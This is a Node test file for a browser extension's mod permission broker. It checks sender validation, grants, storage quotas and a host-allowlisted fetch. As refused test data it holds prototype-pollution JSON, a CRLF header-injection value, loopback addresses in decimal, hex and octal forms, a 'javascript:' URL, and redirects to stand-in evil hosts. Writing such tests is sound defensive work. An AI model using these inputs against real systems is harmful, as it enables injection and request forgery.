// Code mods' permission broker (lib/modbroker.js): every call checked in one place, with stand-in storage and fetch, and the
// worker's sender check (lib/background.js fromLms) on the real helpers it builds on.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const B = require('../lib/modbroker.js');

const SITE = 'https://school.instructure.com';
const ID = 'abcdefghijklmnop', OTHER = 'qrstuvwxyz234567';
const flush = () => new Promise(setImmediate);
const rec = (over = {}) => ({
  id: ID, enabled: true, hash: 'h1', key: 'k1', version: '1.0.0', source: 'file', installedAt: 1, dev: false,
  manifest: { glaze: 1, name: 'Garden', permissions: [{ id: 'grades', why: 'w' }, { id: 'courses', why: 'w' }, { id: 'todo', why: 'w' }, { id: 'network:api.weather.gov', why: 'w' }, { id: 'network:xn--bcher-kva.de', why: 'w' }] },
  grants: { grades: true, courses: true, todo: true, 'network:api.weather.gov': true, 'network:xn--bcher-kva.de': true },
  files: { 'hooks.js': Buffer.from('glaze.ready').toString('base64') },
  ...over,
});
// A storage area like the worker's brokerArea: get gives a copy, set and remove say whether they worked.
const area = (data = {}) => ({
  data,
  async get(k) { await flush(); const keys = k === null ? Object.keys(data) : [].concat(k); return structuredClone(Object.fromEntries(keys.filter((x) => x in data).map((x) => [x, data[x]]))); },
  async set(p) { await flush(); Object.assign(data, structuredClone(p)); return true; },
  async remove(k) { await flush(); for (const x of [].concat(k)) delete data[x]; return true; },
});
const env = ({ site = SITE, record = rec(), local = {}, sync = {}, list = null, fetch } = {}) => {
  const l = area({ [`mod:${ID}`]: record, mods: [ID], ...local });
  let turn = Promise.resolve();
  return {
    site, local: l, sync: area(sync), fetch: fetch || (async () => { throw new Error('no fetch here'); }),
    queue: (f) => (turn = turn.then(f, f)),
    keys: async () => Object.keys(l.data),
    record: async (id) => (await l.get(`mod:${id}`))[`mod:${id}`],
    blocklist: async () => list,
  };
};
const call = (e, callName, args = [], extra = {}) => B.handle({ mod: ID, call: callName, args, via: 'worker', ...extra }, e);

test('dev mode suspends unsigned mods without changing their saved on/off state', async () => {
  const e = env({ record: rec({ dev: true, manifest: { hooks: 'hooks.js' } }), local: {
    modDev: true, mods: [ID, OTHER], [`mod:${OTHER}`]: rec({ id: OTHER, manifest: { hooks: 'hooks.js' } }),
  } });
  for (const enabled of [true, false]) {
    e.local.data[`mod:${ID}`].enabled = enabled;
    for (const dev of [true, false, true]) {
      e.local.data.modDev = dev;
      assert.deepEqual((await B.page({ op: 'list' }, e)).mods.map((m) => m.id), enabled && dev ? [ID, OTHER] : [OTHER]);
      assert.equal((await call(e, 'theme')).ok, enabled && dev);
      assert.equal((await call(e, 'theme', [], { via: 'frame:rail:x' })).ok, enabled && dev);
      if (!dev) assert.deepEqual(await B.page({ op: 'asset', mod: ID, path: 'x.png' }, e), { ok: false, error: 'mod' });
      assert.equal(e.local.data[`mod:${ID}`].enabled, enabled, 'the saved switch is unchanged');
    }
  }
  delete e.local.data.modDev;
  e.local.data[`mod:${ID}`].enabled = true;
  assert.deepEqual(await call(e, 'theme'), { ok: false, error: 'mod' }, 'dev mode defaults off');
});

test('the worker cached record preserves the unsigned flag for the broker', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const code = source.slice(source.indexOf('const modKept ='), source.indexOf('chrome.runtime.onMessage.addListener', source.indexOf('const modKept =')));
  const data = { [`mod:${ID}`]: rec({ dev: true }) };
  const ctx = vm.createContext({ GZ_MODBROKER: B, Map, chrome: { storage: { local: area(data), onChanged: { addListener() {} } } } });
  vm.runInContext(`${code}\nthis.read = modRead;`, ctx);
  const cached = await ctx.read(`mod:${ID}`);
  assert.equal(cached.dev, true);
  assert.deepEqual(await call({ ...env(), record: async () => cached }, 'theme'), { ok: false, error: 'mod' });
});

test('the worker cached record preserves the fixed media source for checked overrides', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const code = source.slice(source.indexOf('const modKept ='), source.indexOf('chrome.runtime.onMessage.addListener', source.indexOf('const modKept =')));
  const parts = { bg: { media: { type: 'image', src: 'https://media.example/background.webp' } } };
  const data = { [`mod:${ID}`]: rec({ manifest: { permissions: [], parts }, grants: {} }) };
  const ctx = vm.createContext({ GZ_MODBROKER: B, Map, chrome: { storage: { local: area(data), onChanged: { addListener() {} } } } });
  vm.runInContext(`${code}\nthis.read = modRead;`, ctx);
  const cached = await ctx.read(`mod:${ID}`);
  const override = { bg: { media: { ...parts.bg.media, dim: 25 } } };
  assert.deepEqual(await call({ ...env(), record: async () => cached }, 'look.override', [override]), { ok: true, value: override });
});

test('a call from no LMS page, for no installed mod, or for a mod turned off or blocklisted is refused', async () => {
  assert.deepEqual(await call(env({ site: null }), 'theme'), { ok: false, error: 'sender' });
  assert.deepEqual(await B.handle({ mod: OTHER, call: 'theme', args: [], via: 'worker' }, env()), { ok: false, error: 'mod' }, 'not installed');
  for (const mod of ['ABCDEFGHIJKLMNOP', 'abc', '', 7, null, '__proto__']) assert.deepEqual(await B.handle({ mod, call: 'theme', args: [] }, env()), { ok: false, error: 'mod' }, String(mod));
  assert.deepEqual(await call(env({ record: rec({ enabled: false }) }), 'theme'), { ok: false, error: 'mod' }, 'turned off');
  assert.deepEqual(await call(env({ record: rec({ enabled: 'yes' }) }), 'theme'), { ok: false, error: 'mod' }, 'only true is on');
  assert.deepEqual(await call(env({ record: rec({ id: OTHER }) }), 'theme'), { ok: false, error: 'mod' }, 'a record under another id');
  assert.deepEqual(await call(env({ record: rec({ blocked: 'malware' }) }), 'theme'), { ok: false, error: 'mod' }, 'marked blocked, even if still on');
  assert.equal((await call(env({ record: rec({ blocked: '' }) }), 'theme')).ok, true, 'an empty mark is none');
  for (const list of [{ mods: [ID] }, { bundles: ['h1'] }, { authors: ['k1'] }]) assert.deepEqual(await call(env({ list }), 'theme'), { ok: false, error: 'blocked' }, JSON.stringify(list));
  for (const list of [null, {}, { mods: 'abcdefghijklmnop' }, { mods: [OTHER] }]) assert.equal((await call(env({ list }), 'theme')).ok, true, `fails open: ${JSON.stringify(list)}`);
});

test('only calls in the API, with arguments as a list within the limit', async () => {
  for (const c of ['nope', 'storage', 'toString', '__proto__', 'constructor', 'hasOwnProperty', '', 3]) assert.deepEqual(await call(env(), c), { ok: false, error: 'call' }, String(c));
  for (const args of [undefined, {}, 'x', null]) assert.deepEqual(await B.handle({ mod: ID, call: 'theme', args, via: 'worker' }, env()), { ok: false, error: 'args' });
  assert.deepEqual(await call(env(), 'storage.set', ['k', 'x'.repeat(B.LIMIT.args)]), { ok: false, error: 'size' });
  const cyclic = []; cyclic.push(cyclic);
  assert.deepEqual(await call(env(), 'theme', cyclic), { ok: false, error: 'args' });
});

test('each data call needs its permission both declared and granted, and goes to a Worker only', async () => {
  const seen = { seenCourses: { _1_1: { name: 'Bio', site: SITE, code: 'BIO' } } };
  assert.equal((await call(env({ local: seen }), 'courses')).ok, true);
  assert.deepEqual(await call(env({ local: seen, record: rec({ grants: { grades: true } }) }), 'courses'), { ok: false, error: 'permission' }, 'not granted');
  assert.deepEqual(await call(env({ local: seen, record: rec({ grants: { courses: 'true' } }) }), 'courses'), { ok: false, error: 'permission' }, 'only true grants');
  assert.deepEqual(await call(env({ local: seen, record: rec({ manifest: { permissions: [] } }) }), 'courses'), { ok: false, error: 'permission' }, 'granted but never declared');
  for (const via of ['frame:tiles:garden', undefined, 'Worker']) assert.deepEqual(await call(env({ local: seen }), 'courses', [], { via }), { ok: false, error: 'permission' }, String(via));
  assert.equal((await call(env({ record: rec({ manifest: { permissions: [] } }) }), 'theme', [], { via: 'frame:tiles:garden' })).ok, true, 'what needs no permission works in a frame UI too');
});

test('courses, plans and grades come from Glaze\'s own caches, this site\'s only, in their slim shape', async () => {
  const e = env({ local: {
    seenCourses: { _1_1: { name: 'Bio', site: SITE, code: 'BIO', slot: 3 }, _2_1: { name: 'Elsewhere', site: 'https://other.edu' }, [`canvas:${SITE}/42`]: { name: 'Chem', code: 'CH', color: '#aabbcc', canvas: true }, 'canvas:https://other.instructure.com/9': { name: 'No' }, [`moodle:${SITE}/7`]: { name: 'Art' } },
    todoCache: { key: `todo:${SITE}/5`, at: 1, items: [{ type: 'assignment', id: '9', cid: '42', course: 'Chem', title: 'Lab', at: 1700000000000, url: '/courses/42/assignments/9', note: 'private words', sub: { submitted: true, late: false }, ov: { id: '3', done: true } }, { id: 'x', url: '//evil.test/x' }] },
    [`insights:${SITE}/5`]: { at: 10, courses: [{ id: '42', name: 'Chem', trend: [[1, 80], [2, 91.5]] }, { id: '43', name: 'Nothing yet', trend: [] }] },
    [`insights:${SITE}/6`]: { at: 5, courses: [{ id: '1', name: 'Old account', trend: [[1, 50]] }] },
    'insights:https://other.instructure.com/5': { at: 99, courses: [{ id: '1', name: 'Other school', trend: [[1, 1]] }] },
  } });
  assert.deepEqual((await call(e, 'courses')).value, [{ id: '_1_1', name: 'Bio', code: 'BIO', color: null }, { id: '42', name: 'Chem', code: 'CH', color: '#aabbcc' }, { id: '7', name: 'Art', code: '', color: null }]);
  const todo = (await call(e, 'todo')).value;
  assert.deepEqual(todo[0], { id: '9', type: 'assignment', courseId: '42', course: 'Chem', title: 'Lab', due: 1700000000000, url: `${SITE}/courses/42/assignments/9`, done: true, submitted: true, graded: false, late: false, missing: false });
  assert.equal(todo[1].url, '', 'never another site\'s address');
  assert.ok(!JSON.stringify(todo).includes('private words'), 'planner notes stay out');
  assert.deepEqual((await call(env({ local: { todoCache: { key: 'todo:https://other.instructure.com/5', at: 1, items: [{ id: '1' }] } } }), 'todo')).value, [], 'another site\'s plans');
  assert.deepEqual((await call(e, 'grades')).value, [{ courseId: '42', name: 'Chem', percent: 91.5, at: 2 }], 'the newest account\'s, latest point');
  assert.deepEqual((await call(e, 'grades', ['43'])).value, []);
  assert.deepEqual(await call(e, 'grades', [{}]), { ok: false, error: 'args' });
});

test('schedule returns cached due items in the inclusive range with todo cleaning and a result cap', async () => {
  const from = 1700000000000, to = from + 864e5;
  const items = [{ id: 'before', at: from - 1 }, { id: 'start', at: from, title: 'Lab', note: 'private', url: '//evil.test/x' },
    { id: 'end', at: to, url: '/courses/42/assignments/9', sub: { submitted: true }, ov: { done: true } },
    { id: 'after', at: to + 1 }, { id: 'undated', at: null }, { id: 'string', at: String(from) }, null];
  const e = env({ local: { todoCache: { key: `todo:${SITE}/5`, items } } });
  const todo = (await call(e, 'todo')).value;
  assert.deepEqual(await call(e, 'schedule', [from, to]), { ok: true, value: todo.slice(1, 3) });
  assert.deepEqual((await call(e, 'schedule', [to, to])).value.map((i) => i.id), ['end'], 'a single instant includes its due item');
  e.local.data.todoCache.items = [
    ...Array.from({ length: B.LIMIT.items + 1 }, () => ({ at: from - 1 })),
    ...Array.from({ length: B.LIMIT.items + 1 }, (_, id) => ({ id: String(id), at: from })),
  ];
  const bounded = await call(e, 'schedule', [from, to]);
  assert.equal(bounded.ok, true);
  assert.equal(bounded.value.length, B.LIMIT.items, 'the cap is applied after filtering');
  assert.equal(bounded.value.at(-1).id, String(B.LIMIT.items - 1));
});

test('schedule requires a granted todo permission in a Worker and reads only this site', async () => {
  const args = [1700000000000, 1700000000000 + 864e5];
  for (const record of [rec({ grants: {} }), rec({ manifest: { permissions: [] } })]) {
    assert.deepEqual(await call(env({ record }), 'schedule', args), { ok: false, error: 'permission' });
  }
  assert.deepEqual(await call(env(), 'schedule', args, { via: 'frame:rail:x' }), { ok: false, error: 'permission' });
  for (const todoCache of [undefined, {}, { key: 'todo:https://other.instructure.com/5', items: [{ at: args[0] }] }, { key: `todo:${SITE}/5`, items: {} }]) {
    assert.deepEqual(await call(env({ local: { todoCache } }), 'schedule', args), { ok: true, value: [] });
  }
});

test('schedule refuses invalid timestamps, reversed ranges and ranges over 60 days', async () => {
  const day = 864e5, from = 1700000000000;
  assert.deepEqual(await call(env(), 'schedule', [from, from + 60 * day]), { ok: true, value: [] });
  for (const args of [[], [from], [from, from, 1], [from + 1, from], [from, from + 60 * day + 1],
    [-1, 0], ['0', day], [null, day], [NaN, day], [0, Infinity], [0.5, day], [0, Number.MAX_SAFE_INTEGER + 1]]) {
    assert.deepEqual(await call(env(), 'schedule', args), { ok: false, error: 'args' }, String(args));
  }
});

test('the host exposes schedule and sends both timestamps to the broker', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../mods/host.js'), 'utf8').match(/function glazeClient\(port\) \{[\s\S]*?\n    return glaze;\n  \}/)[0];
  const e = env(), listeners = [], sent = [];
  const port = { start() {}, addEventListener(t, f) { listeners.push(f); }, postMessage(m) {
    sent.push(m);
    call(e, m.call, m.args).then((r) => { for (const f of listeners) f({ data: { id: m.id, ...r } }); });
  } };
  const glaze = vm.runInContext(`(${source})`, vm.createContext({ setTimeout, performance }))(port);
  assert.deepEqual(await glaze.schedule(0, 864e5), []);
  assert.deepEqual(sent[0].call, 'schedule');
  assert.deepEqual(Array.from(sent[0].args), [0, 864e5]);
});

test('theme gives the palette\'s tokens, whether it is dark and the motion level, with no permission', async () => {
  const r = await call(env({ sync: { colors: { '--gz-surface': '#ffffff' }, motion: { level: 'off' } }, record: rec({ grants: {} }) }), 'theme');
  assert.equal(r.ok, true);
  assert.equal(r.value.dark, false);
  assert.equal(r.value.motion, 'off');
  assert.match(r.value.tokens.accent, /^#[0-9a-f]{6}$/);
  assert.equal((await call(env(), 'theme')).value.dark, true, 'the default palette is dark');
});

test('storage is the mod\'s own, at most 1 MiB, on this device, and no key reaches a prototype', async () => {
  const e = env();
  assert.deepEqual(await call(e, 'storage.get', ['a']), { ok: true, value: null });
  assert.deepEqual(await call(e, 'storage.set', ['a', { n: 1 }]), { ok: true, value: true });
  assert.deepEqual(await call(e, 'storage.get', ['a']), { ok: true, value: { n: 1 } });
  assert.deepEqual(await call(e, 'storage.get', []), { ok: true, value: { a: { n: 1 } } });
  assert.deepEqual(e.local.data[`modData:${ID}`], { a: { n: 1 } }, 'storage.local, under the mod\'s id');
  // Two writes at once both land (the worker's queue).
  await Promise.all([call(e, 'storage.set', ['b', 2]), call(e, 'storage.set', ['c', 3])]);
  assert.deepEqual(Object.keys(e.local.data[`modData:${ID}`]).sort(), ['a', 'b', 'c']);
  // The quota counts what is stored, all keys together.
  assert.deepEqual(await call(e, 'storage.set', ['big', 'x'.repeat(600 * 1024)]), { ok: true, value: true });
  assert.deepEqual(await call(e, 'storage.set', ['big2', 'x'.repeat(500 * 1024)]), { ok: false, error: 'quota' });
  assert.ok(!('big2' in e.local.data[`modData:${ID}`]), 'a refused write changes nothing');
  assert.deepEqual(await call(e, 'storage.set', ['big2', 'é'.repeat(220 * 1024)]), { ok: false, error: 'quota' }, 'bytes, not characters (839 Ki characters, 1,040 KiB)');
  assert.deepEqual(await call(e, 'storage.remove', ['big']), { ok: true, value: true });
  for (const args of [[], [''], ['x'.repeat(257)], [{}], ['k']]) assert.deepEqual(await call(e, 'storage.set', args), { ok: false, error: 'args' }, JSON.stringify(args).slice(0, 40));
  // Another mod's store is out of reach, whatever the key says.
  e.local.data[`modData:${OTHER}`] = { secret: 1 };
  assert.deepEqual(await call(e, 'storage.get', [`../modData:${OTHER}`]), { ok: true, value: null });
  // Prototype pollution: keys and values arrive as JSON, so __proto__ can be an own key; it stays one.
  const evil = JSON.parse('{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted": true}}}');
  for (const k of ['__proto__', 'constructor', 'prototype', 'hasOwnProperty']) assert.deepEqual(await call(e, 'storage.set', [k, evil]), { ok: true, value: true }, k);
  assert.equal(({}).polluted, undefined);
  assert.equal(Object.prototype.polluted, undefined);
  assert.deepEqual(await call(e, 'storage.get', ['__proto__']), { ok: true, value: evil });
  assert.equal(Object.getPrototypeOf(e.local.data[`modData:${ID}`]), Object.prototype);
  assert.deepEqual(await call(e, 'storage.get', ['toString']), { ok: true, value: null }, 'inherited names are not stored keys');
  const r = await B.handle(JSON.parse(`{"mod": "${ID}", "call": "theme", "args": [], "via": "worker", "__proto__": {"via": "worker"}}`), env());
  assert.equal(r.ok, true);
  assert.equal(({}).via, undefined);
});

// ---- fetch ---------------------------------------------------------------------------------------------------------------
const body = (text, { headers, ...extra } = {}) => ({ status: 200, ok: true, type: 'basic', body: new Blob([text]).stream(), ...extra, headers: new Headers({ 'content-type': 'text/plain', 'set-cookie': 'x=1', ...headers }) });
const fetcher = (respond = () => body('hi')) => { const asked = []; return { asked, fetch: async (url, init) => { asked.push({ url, init }); return respond(url, init); } }; };

test('fetch reaches only a granted host, written exactly, on https\'s own port, without credentials', async () => {
  const f = fetcher();
  const e = env({ fetch: f.fetch });
  const r = await call(e, 'fetch', ['https://api.weather.gov/points?x=1', {}]);
  assert.deepEqual(r, { ok: true, value: { status: 200, ok: true, headers: { 'content-type': 'text/plain' }, text: 'hi' } });
  assert.equal(f.asked[0].url, 'https://api.weather.gov/points?x=1');
  const init = f.asked[0].init;
  assert.deepEqual([init.method, init.credentials, init.referrer, init.referrerPolicy, init.redirect, init.cache], ['GET', 'omit', '', 'no-referrer', 'manual', 'no-store']);
  assert.ok(init.signal instanceof AbortSignal, 'a timeout');
  // The same host however it is written: the URL parser's form decides.
  for (const u of ['https://API.Weather.GOV/x', 'https://api.weather.gov:443/x', 'https://api.weather.gov/./x/../y', 'https://bücher.de/', 'https://BÜCHER.de/', 'https://xn--bcher-kva.de/']) assert.equal((await call(e, 'fetch', [u])).ok, true, u);
  // Not granted, or not that host.
  const refused = {
    permission: ['https://weather.gov/', 'https://evil.api.weather.gov/', 'https://api.weather.gov.evil.com/', 'https://other.example/', 'https://xn--bcher-kva.com/', 'https://api.weаther.gov/'],
    args: ['http://api.weather.gov/', 'https://api.weather.gov:8443/', 'https://user:pw@api.weather.gov/', 'https://user@api.weather.gov/', 'https://api.weather.gov./',
      'wss://api.weather.gov/', 'ftp://api.weather.gov/', 'javascript:alert(1)', 'data:text/plain,x', 'https://127.0.0.1/', 'https://0x7f000001/', 'https://2130706433/', 'https://0177.0.0.1/', 'https://127.1/', 'https://[::ffff:127.0.0.1]/', 'https://[::1]/', 'https://localhost/',
      'https://printer.local/', 'https://router/', '/relative', '', 'https://api.weather.gov/' + 'x'.repeat(5000)],
  };
  for (const [error, urls] of Object.entries(refused)) for (const u of urls) assert.deepEqual(await call(e, 'fetch', [u]), { ok: false, error }, u);
  assert.deepEqual(await call(e, 'fetch', [{ toString: () => 'https://api.weather.gov/' }]), { ok: false, error: 'args' }, 'a string only');
  assert.equal(f.asked.length, 7, 'nothing refused was fetched');
  // A grant written oddly still names one host exactly; a grant with a port, path, address or wildcard names none.
  for (const g of ['network:api.weather.gov:8443', 'network:api.weather.gov/x', 'network:*.weather.gov', 'network:127.0.0.1', 'network:localhost', 'network:user@api.weather.gov'])
    assert.equal(B.perm(g), '', g);
  assert.equal(B.perm('network:API.weather.gov'), 'network:api.weather.gov');
  assert.equal(B.perm('network:bücher.de'), 'network:xn--bcher-kva.de');
  const odd = rec({ manifest: { permissions: [{ id: 'network:api.weather.gov:8443' }] }, grants: { 'network:api.weather.gov:8443': true } });
  assert.deepEqual(await call(env({ record: odd, fetch: f.fetch }), 'fetch', ['https://api.weather.gov/']), { ok: false, error: 'permission' });
});

test('fetch sends GET or POST with allowed headers only, refuses every redirect, and caps the answer and its time', async () => {
  const f = fetcher();
  const e = env({ fetch: f.fetch });
  const u = 'https://api.weather.gov/';
  assert.equal((await call(e, 'fetch', [u, { method: 'post', body: '{"a":1}', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer mine' } }])).ok, true);
  assert.deepEqual(f.asked.at(-1).init.headers, { 'content-type': 'application/json', authorization: 'Bearer mine' });
  for (const [init, error] of [[{ method: 'PUT' }, 'method'], [{ method: 'DELETE' }, 'method'], [{ method: 1 }, 'method'], [{ headers: { Cookie: 'a=b' } }, 'header'], [{ headers: { Referer: 'x' } }, 'header'],
    [{ headers: { Origin: 'x' } }, 'header'], [{ headers: { accept: 'a\r\nCookie: x' } }, 'header'], [{ headers: { accept: 1 } }, 'header'], [{ headers: [] }, 'args'], [{ body: 'x' }, 'args'],
    [{ method: 'POST', body: { a: 1 } }, 'args'], [[], 'args'], ['x', 'args'], [null, 'args']])
    assert.deepEqual(await call(e, 'fetch', [u, init]), { ok: false, error }, JSON.stringify(init));
  const n = f.asked.length;
  // Redirects: never followed, whether to the same host or away.
  for (const resp of [{ status: 0, ok: false, type: 'opaqueredirect' }, { status: 302, ok: false, type: 'basic', headers: { location: 'https://evil.example/' } }, { status: 301, ok: false, type: 'basic', headers: { location: '/same' } }]) {
    const g = fetcher(() => body('', resp));
    assert.deepEqual(await call(env({ fetch: g.fetch }), 'fetch', [u]), { ok: false, error: 'redirect' }, JSON.stringify(resp));
  }
  // Size: by the declared length, and by what actually comes.
  assert.deepEqual(await call(env({ fetch: fetcher(() => body('x', { headers: { 'content-length': String(3 * 1024 * 1024) } })).fetch }), 'fetch', [u]), { ok: false, error: 'size' });
  assert.deepEqual(await call(env({ fetch: fetcher(() => body('x'.repeat(2 * 1024 * 1024 + 1))).fetch }), 'fetch', [u]), { ok: false, error: 'size' });
  assert.equal((await call(env({ fetch: fetcher(() => body('x'.repeat(2 * 1024 * 1024))).fetch }), 'fetch', [u])).value.text.length, 2 * 1024 * 1024, 'exactly the cap is fine');
  // Network failure and the timeout.
  assert.deepEqual(await call(env({ fetch: async () => { throw new TypeError('Failed to fetch'); } }), 'fetch', [u]), { ok: false, error: 'network' });
  assert.deepEqual(await call(env({ fetch: async () => { throw new DOMException('t', 'TimeoutError'); } }), 'fetch', [u]), { ok: false, error: 'timeout' });
  assert.equal(f.asked.length, n);
});

test('an answer bigger than the limit is refused', async () => {
  const many = Array.from({ length: 450 }, (_, i) => [`canvas:${SITE}/${i}`, { name: 'n'.repeat(200) + 'é'.repeat(5000) }]);
  const e = env({ local: { seenCourses: Object.fromEntries(many) } });
  const r = await call(e, 'courses');
  assert.equal(r.ok, true, 'names are cut to 200 characters, so a long list still fits');
  assert.equal(r.value.length, 450);
  const big = env({ local: { [`modData:${ID}`]: Object.fromEntries(Array.from({ length: 5 }, (_, i) => [`k${i}`, 'x'.repeat(1024 * 1024)])) } });
  assert.deepEqual(await call(big, 'storage.get', []), { ok: false, error: 'size' }, 'a store over the quota (written some other way) isn\'t sent back whole');
});

// ---- the page's asks -----------------------------------------------------------------------------------------------------
test('the page is told which mods to start: on, not blocklisted, with code, in the student\'s order; a data mod gets no frame UI', async () => {
  const b64 = (s) => Buffer.from(s).toString('base64');
  const frameMod = rec({ id: OTHER, manifest: { name: 'Clock', permissions: [{ id: 'network:api.weather.gov' }], ui: { tiles: [{ id: 'clock', file: 'ui/clock.html' }], rail: [], nav: null }, hooks: 'hooks.js' },
    files: { 'hooks.js': b64('1'), 'ui/clock.html': b64('<p>hi</p>'), 'ui/clock.js': b64('2'), 'ui/clock.css': b64('p{}'), 'art.png': b64('PNG') } });
  const dataMod = rec({ manifest: { ...rec().manifest, ui: { tiles: [{ id: 'g', file: 'g.html' }] }, hooks: 'hooks.js' }, files: { 'hooks.js': b64('glaze.grades()'), 'g.html': b64('<p>') } });
  const e = env({ record: dataMod, local: { mods: [ID, OTHER, ID, 'bad id'], [`mod:${OTHER}`]: frameMod } });
  const r = await B.page({ op: 'list' }, e);
  assert.deepEqual(r.mods.map((m) => [m.id, m.worker, m.slots]), [[ID, 'glaze.grades()', [{ key: 'tile:g', name: '', size: 's', file: null }]], [OTHER, '1', [{ key: 'tile:clock', name: '', size: 's', file: 'ui/clock.html' }]]]);
  assert.deepEqual(r.mods.map((m) => [m.events, m.on]), [[['courses', 'todo', 'grades'], []], [[], []]], 'data events as granted; no replacement turned on');
  e.local.data.modOrder = [OTHER, 'zzzzzzzzzzzzzzzz'];
  assert.deepEqual((await B.page({ op: 'list' }, e)).mods.map((m) => m.id), [OTHER, ID], 'modOrder first, the rest after');
  delete e.local.data.modOrder;
  assert.deepEqual(Object.keys(r.mods[1].text).sort(), ['hooks.js', 'ui/clock.css', 'ui/clock.html', 'ui/clock.js'], 'its text files only');
  assert.deepEqual(r.mods[0].text, {});
  e.local.data[`mod:${OTHER}`] = { ...frameMod, enabled: false };
  assert.deepEqual((await B.page({ op: 'list' }, e)).mods.map((m) => m.id), [ID]);
  assert.deepEqual((await B.page({ op: 'list' }, { ...e, blocklist: async () => ({ authors: ['k1'] }) })).mods, []);
  e.local.data[`mod:${ID}`] = rec({ files: { 'hooks.js': '%%%not base64' }, manifest: { ...rec().manifest, hooks: 'hooks.js' } });
  assert.deepEqual((await B.page({ op: 'list' }, e)).mods, [], 'a file that isn\'t base64 starts nothing');
  assert.deepEqual(await B.page({ op: 'list' }, { ...e, site: null }), { ok: false, error: 'sender' });
  assert.deepEqual(await B.page({ op: 'list' }, env({ local: { mods: 'x' } })), { ok: true, mods: [], plain: [] });
});

test('a stop the watchdog made is kept for the editor, the last 50', async () => {
  const e = env();
  assert.deepEqual(await B.page({ op: 'stopped', mod: ID, why: 'hung' }, e), { ok: true });
  assert.equal(e.local.data.modStops[ID].why, 'hung');
  for (const bad of [{ op: 'stopped', mod: ID, why: 'bored' }, { op: 'stopped', mod: 'x', why: 'hung' }, { op: 'nope' }, {}]) assert.deepEqual(await B.page(bad, e), { ok: false, error: 'op' });
  assert.deepEqual(await B.page({ op: 'stopped', mod: ID, why: 'hung' }, { ...e, site: null }), { ok: false, error: 'sender' });
});

test('whether the sandbox runs here is kept for the editor, written only when it changes', async () => {
  const e = env();
  let writes = 0;
  const set = e.local.set;
  e.local.set = (p) => { writes++; return set.call(e.local, p); };
  assert.deepEqual(await B.page({ op: 'runtime', ok: true }, e), { ok: true });
  assert.deepEqual(await B.page({ op: 'runtime', ok: true }, e), { ok: true });
  assert.equal(writes, 1);
  assert.deepEqual(await B.page({ op: 'runtime', ok: false }, e), { ok: true });
  assert.equal(e.local.data.modRuntime.ok, false);
  assert.deepEqual(await B.page({ op: 'runtime', ok: 'no' }, e), { ok: false, error: 'op' });
  assert.deepEqual(await B.page({ op: 'runtime', ok: true }, { ...e, site: null }), { ok: false, error: 'sender' });
});

// ---- the worker's sender check (lib/background.js) -------------------------------------------------------------------------
test('only Glaze\'s content script in the top frame of an LMS page it runs on, with Glaze on, off quiz and tool pages', async () => {
  const src = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const helpers = src.slice(src.indexOf('const fromEditor ='), src.indexOf('// Gradescope (lib/gradescope.js)'));
  const mine = src.slice(src.indexOf('const modQuiet ='), src.indexOf('const modKept ='));
  const store = { local: { canvas: ['https://canvas.school.edu/*'], moodle: ['https://moodle.school.edu/*'], ultra: ['https://bb.school.edu'] }, sync: { enabled: true } };
  const chrome = {
    runtime: { id: 'glaze', getURL: (p = '') => `chrome-extension://glaze/${p}`, getManifest: () => ({ host_permissions: ['<all_urls>'] }) },
    storage: Object.fromEntries(['local', 'sync'].map((a) => [a, { get: async (k) => Object.fromEntries([].concat(k).filter((x) => x in store[a]).map((x) => [x, store[a][x]])) }])),
  };
  const ctx = vm.createContext({ chrome, URL, GZ_LX: require('../lib/lookx.js'), Promise });
  vm.runInContext(`${helpers}\n${mine}\nthis.fromLms = fromLms;`, ctx);
  const s = (url, over = {}) => ({ id: 'glaze', url, frameId: 0, tab: { id: 1, url }, ...over });
  const yes = { 'https://x.instructure.com/courses/1': 'https://x.instructure.com', 'https://canvas.school.edu/': 'https://canvas.school.edu', 'https://moodle.school.edu/my/': 'https://moodle.school.edu', 'https://bb.school.edu/ultra/course': 'https://bb.school.edu' };
  for (const [u, o] of Object.entries(yes)) assert.equal(await ctx.fromLms(s(u)), o, u);
  const no = [s('https://x.instructure.com/', { id: 'another-extension' }), s('https://x.instructure.com/', { tab: undefined }), s('https://x.instructure.com/', { frameId: 3 }),
    s('https://example.com/'), s('https://bb.other.edu/ultra/course'), s('http://canvas.school.edu/'), s('https://moodle.school.edu.evil.com/'), s('not a url'),
    s('https://x.instructure.com/courses/1/quizzes/2/take'), s('https://x.instructure.com/courses/1/quizzes/2'), s('https://x.instructure.com/courses/1/external_tools/5'),
    s('https://bb.school.edu/ultra/courses/_1_1/outline/assessment/_2_1'), s('https://bb.school.edu/ultra/courses/_1_1/lti/launch'), s('https://moodle.school.edu/mod/quiz/attempt.php'), s('https://moodle.school.edu/mod/lti/view.php')];
  for (const x of no) assert.equal(await ctx.fromLms(x), null, `${x.url} ${x.id} ${x.frameId}`);
  const frame = s('https://bb.school.edu/ultra/courses/_1_1/outline', { frameId: 3, tab: { id: 1, url: 'https://bb.school.edu/ultra/course' } });
  for (const url of [frame.url, 'about:blank']) {
    const sender = { ...frame, url, origin: 'https://bb.school.edu' };
    assert.equal(await ctx.fromLms(sender, true), 'https://bb.school.edu', 'parts in a same-site Ultra course frame');
    assert.equal(await ctx.fromLms(sender), null, 'code and other mod operations stay top-frame only');
  }
  for (const sender of [...no, { ...frame, tab: { id: 1, url: 'https://other.school.edu/ultra/course' } },
    { ...frame, url: 'about:blank', origin: 'https://other.school.edu' }, { ...frame, url: 'https://bb.school.edu/ultra/courses/_1_1/assessment/_2_1' }]) {
    assert.equal(await ctx.fromLms(sender, true), null, `parts refuse ${sender.url}`);
  }
  assert.match(src, /site: preview \? 'editor' : await fromLms\(s, m\.type === 'glaze:modpage' && m\.op === 'parts'\)/);
  // Only the editor's own pages stand in for a page, and only to read parts and a mod's background file.
  assert.match(src, /const preview = m\.type === 'glaze:modpage' && \['parts', 'media'\]\.includes\(m\.op\) && fromPreview\(s\);/);
  store.sync.enabled = false;
  assert.equal(await ctx.fromLms(s('https://x.instructure.com/')), null, 'Glaze turned off');
});


test('the broker reads and invalidates the blocklist package storage shape', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
